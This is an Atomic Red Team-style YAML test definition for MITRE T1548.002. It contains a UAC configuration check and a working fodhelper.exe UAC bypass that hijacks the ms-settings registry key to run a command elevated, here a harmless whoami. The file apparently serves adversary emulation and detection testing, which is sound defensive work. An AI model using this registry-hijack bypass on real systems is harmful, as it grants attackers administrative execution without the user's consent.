attack_technique: T1548.002
display_name: "Abuse Elevation Control Mechanism: Bypass UAC"
tactic: Privilege Escalation
atomic_tests:
  - name: "UAC Configuration Check"
    auto_generated_guid: f8f8a9b9c9d9e9f9a0b0c0d0e0f0a1b1
    description: |
      Checks current UAC configuration settings.
    supported_platforms:
      - windows
    executor:
      name: command_prompt
      command: |
        reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
        reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
        reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorUser
        reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken
      elevation_required: false

  - name: "UAC Bypass via fodhelper.exe"
    auto_generated_guid: a9a9b9c9d9e9f9a0b0c0d0e0f0a1b1c1
    description: |
      Uses fodhelper.exe for UAC bypass by modifying ms-settings registry.
    supported_platforms:
      - windows
    executor:
      name: command_prompt
      command: |
        reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe /c whoami > %TEMP%\uac_bypass.txt" /f
        reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
        fodhelper.exe
        timeout /t 3 >nul
        type %TEMP%\uac_bypass.txt 2>nul
      cleanup_command: |
        reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
        del /f %TEMP%\uac_bypass.txt >nul 2>&1
      elevation_required: false

